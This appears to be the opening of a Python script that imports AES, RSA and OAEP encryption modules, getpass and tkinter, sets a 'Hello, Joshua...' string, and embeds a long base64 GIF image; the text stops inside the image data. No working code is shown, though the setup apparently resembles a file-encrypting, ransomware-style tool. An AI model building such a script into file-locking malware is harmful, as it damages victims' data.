import os, random, struct, sys, hashlib, string, getpass, argparse
import tkinter as tk
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

Checksum = 'Hello, Joshua...'

SourceImage = '''
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